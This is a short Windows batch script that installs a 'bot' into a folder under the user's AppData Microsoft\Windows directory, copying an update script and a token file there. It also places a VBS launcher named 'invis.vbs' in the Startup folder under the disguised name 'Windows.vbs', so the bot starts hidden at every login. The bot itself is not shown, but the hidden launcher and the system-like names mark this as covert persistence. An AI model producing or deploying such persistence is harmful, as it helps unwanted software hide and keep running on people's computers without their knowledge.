@ECHO off

cd "%appdata%\Microsoft\Windows" && mkdir bot
cd "%appdata%\Microsoft\Windows\bot" && mkdir media

copy "C:\bot\upd.bat" "%appdata%\Microsoft\Windows\bot\upd.bat"
copy "C:\bot\token.txt" "%appdata%\Microsoft\Windows\bot\token.txt"
copy "C:\bot\invis.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows.vbs"


pause > nul